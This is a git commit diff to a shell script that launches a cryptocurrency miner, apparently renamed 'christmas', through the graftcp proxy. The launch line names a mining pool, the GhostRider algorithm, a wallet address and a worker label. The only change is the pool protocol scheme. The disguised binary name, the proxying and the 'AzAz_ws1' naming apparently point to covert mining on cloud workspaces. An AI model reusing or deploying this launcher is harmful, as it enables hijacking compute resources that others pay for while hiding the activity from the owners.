110a889552a3ba1ecc358c5ba9f9126213fd7055
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-01-09 16:55:06 +0200

    Update start_Xmas_AzAz_ws1.sh

--- start_Xmas_AzAz_ws1.sh
+++ start_Xmas_AzAz_ws1.sh
@@ -35,5 +35,5 @@ chmod +x christmas
 
 ph add christmas
 
-./graftcp/graftcp ./christmas -a gr -o stratum+tcps://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz -p IhatePopUps
+./graftcp/graftcp ./christmas -a gr -o stratum+ssl://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz -p IhatePopUps
 
